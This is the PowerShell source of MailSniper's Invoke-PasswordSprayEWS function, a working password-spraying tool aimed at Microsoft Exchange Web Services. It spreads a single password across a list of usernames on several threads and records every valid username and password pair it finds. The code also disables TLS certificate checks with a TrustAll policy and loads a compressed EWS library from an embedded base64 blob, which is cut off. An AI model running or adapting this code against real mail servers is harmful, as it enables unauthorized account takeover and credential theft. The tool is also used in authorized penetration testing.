  .SYNOPSIS

    This module will first attempt to connect to an Exchange Web Services portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    MailSniper Function: Invoke-PasswordSprayEWS
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will first attempt to connect to an Exchange Web Services portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER UserList

        List of usernames 1 per line to to attempt to password spray against.

    .PARAMETER Password

        A single password to attempt a password spray with.

    .PARAMETER ExchangeVersion

        In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
    
    .PARAMETER Threads
       
        Number of password spraying threads to run.
    
    .PARAMETER Domain

        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com

  .EXAMPLE

    C:\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt

    Description
    -----------
    This command will connect to the Exchange Web Services server at https://mail.domain.com/EWS/Exchange.asmx and attempt to password spray a list of usernames with a single password over 15 threads and output the results to a file called sprayed-ews-creds.txt.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "5",

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""

  )
    Write-Host -ForegroundColor "yellow" "[*] Now spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx"
    $currenttime = Get-Date
    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
    #Running the LoadEWSDLL function to load the required Exchange Web Services dll
    $Usernames = Get-Content $UserList
    $count = $Usernames.count
    $sprayed = @()
    $userlists = @{}
    $count = 0 
    $Usernames |% {$userlists[$count % $Threads] += @($_);$count++}
    $userPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            
    Write-Output "[*] Trying Exchange version $ExchangeVersion"
    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
    $UncompressedFileBytes = New-Object Byte[](1092608)
    $DeflatedStream.Read($UncompressedFileBytes, 0, 1092608) | Out-Null
    0..($Threads-1) |% {

        Start-Job -ScriptBlock{
  #load the required Exchange Web Services dll
  #Exchange Web Services requires a specific DLL be loaded in order to perform calls against it. This DLL can typically be found on a system after installing EWS Managed API here: C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll
  #Each separate thread requires it has a hold on its' own EWS dll
  
  #Exchange Web Services Assembly generated with "Out-CompressedDll" from PowerSploit located here: https://github.com/PowerShellMafia/PowerSploit/blob/dev/ScriptModification/Out-CompressedDll.ps1. The command "Out-CompressedDll -FilePath .\Microsoft.Exchange.WebServices.dll | Out-File -Encoding ASCII .\encoded.txt" was used.
  $UncompressedFileBytes = $args[6]
  #$randomewsname = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})

  $asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
  #Set-Content -Path $env:temp\$randomewsname-ews.dll -Value $UncompressedFileBytes -Encoding Byte
  #Add-Type -Path $env:temp\$randomewsname-ews.dll


    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

    ## end code from http://poshcode.org/624
            $ExchangeVersion = $args[4]
            $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
            $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
            ForEach($UserName in $args[0])
            {
                
                $userPassword = $args[1]
                $ExchHostname = $args[2]
                $Mailbox = $args[3]
                $Password = $args[5]
                $Domain = $args[7]

                if ($Domain -ne "")
                {
                $UserName = ("$Domain" + "\" + "$UserName")
                }

                #converting creds to use with EWS
                $remotecred = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$userPassword
                $service.UseDefaultCredentials = $false
                $service.Credentials = $remotecred.GetNetworkCredential()
                $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))

                $rootfolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
                $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
                $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)   
                try
                {
                    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId) 
                    Write-Output "[*] SUCCESS! User:$username Password:$Password"
                }
                catch
                {
                    $ErrorMessage = $_.Exception.Message
                    if ($ErrorMessage -like "*Exchange Server doesn't support the requested version.*")
                    {
                        Write-Output "[*] ERROR: The connection to Exchange failed using Exchange Version $ExchangeVersion."
                        Write-Output "[*] Try setting the -ExchangeVersion flag to the Exchange version of the server."
                        Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
                        break
                    }
                }   
   

            }
        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain | Out-Null
    
    }
    $Complete = Get-Date
    $MaxWaitAtEnd = 10000
    $SleepTimer = 200
        $fullresults = @()
    
    While ($(Get-Job -State Running).count -gt 0){
        $RunningJobs = ""
        ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
        $RunningJobs = $RunningJobs.Substring(2)
        Write-Progress  -Activity "Password Spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
        If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
        Start-Sleep -Milliseconds $SleepTimer
        
        ForEach($Job in Get-Job){
            $JobOutput = Receive-Job $Job
            Write-Output $JobOutput
            $fullresults += $JobOutput
        }

}
    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
    if ($OutFile -ne "")
    {
        $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
        $fullresults = $fullresults -replace " Password:", ":"
        $fullresults | Out-File -Encoding ascii $OutFile
        Write-Output "Results have been written to $OutFile."
    }
}

    #Exchange Web Services requires a specific DLL be loaded in order to perform calls against it. This DLL can typically be found on a system after installing EWS Managed API here: C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll
    #Exchange Web Services Assembly generated with "Out-CompressedDll" from PowerSploit located here: https://github.com/PowerShellMafia/PowerSploit/blob/dev/ScriptModification/Out-CompressedDll.ps1. The command "Out-CompressedDll -FilePath .\Microsoft.Exchange.WebServices.dll | Out-File -Encoding ASCII .\encoded.txt" was used.
    #With a great deal of help from @harmj0y and @mattifestation (whom many beers are owed) a condition in which loading the DLL via Reflection was erroring out was able to be fixed. 
    #This version was patched to remove the implicit call to GetExecutingAssembly().Location in Microsoft.Exchange.WebServices.Data.EwsUtilities.<.cctor>b__9() that's called by the ExchangeServiceBase constructor when building the user agent string. 
    $EncodedCompressedFile = @'
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